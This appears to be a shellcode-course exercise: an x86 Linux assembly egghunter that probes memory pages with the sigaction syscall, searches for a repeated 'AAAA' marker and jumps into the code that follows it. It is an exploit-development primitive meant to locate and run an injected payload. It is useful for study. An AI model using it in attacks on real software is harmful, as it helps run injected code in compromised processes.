; Simple x86 egghunter
;
; For SLAE32
; Howard McGreehan

global _start

section .text

_start:
	; zero out ecx 4 kicks
	xor ecx, ecx 

bad_mem:

	; Pages are 4096 bytes, or 0x1000 which contains null bytes
	; so we can set it to 0xfff, or 4095 each time and inc it 
	or cx, 0xfff
	
egghunt:

	; This fixes the page size, getting it to a full 4096
	inc ecx

	; int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact)
	mov al, 0x43
	int 0x80

	; compare the output of access to a known error
	; sigaction() returns -1 when it encounters an error
	; 0xf2 = 14, or EFAULT (bad address)
	cmp al, 0xf2

	; increase the page in the event we get an error and try again	
	je bad_mem

	; if we don't get an error, we can check the memory for our egg
	; AAAA
	mov eax, 0x41414141
	mov edi, ecx

	scasd

	jnz egghunt

	scasd

	jnz egghunt

	 
	jmp edi

	


